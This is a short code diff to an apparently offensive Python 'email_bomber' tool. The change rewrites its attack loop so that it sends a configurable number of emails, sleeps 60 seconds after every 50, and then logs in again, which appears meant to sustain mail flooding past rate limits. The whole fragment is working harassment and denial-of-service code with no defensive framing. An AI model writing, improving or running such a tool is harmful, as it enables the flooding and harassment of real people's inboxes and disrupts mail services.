@@ -126,15 +126,14 @@ class email_bomber:
 
     def attack(self):
         print(bcolors.RED + '\n*****Attacking*****')
-
-        for email in range(20):
-            print(bcolors.RED + '\n--- Attempting Secure Account Login ---')
-            self.s.login(self.fromAddr,self.fromPwsd)
-            print(bcolors.RED + 'Taking First Step...')
-            for email in range(50):
-                self.send()
-                time.sleep(0.5)
-            time.sleep(60)
+        step_counter = 0
+        for email in range(self.amount):
+            step_counter += 1
+            self.send()
+            time.sleep(0.5)
+            if step_counter % 50 == 0:
+                time.sleep(60)
+                self.s.login(self.fromAddr,self.fromPwsd)
         self.s.close()
         print(bcolors.RED + '*****Attack Finished****')
         
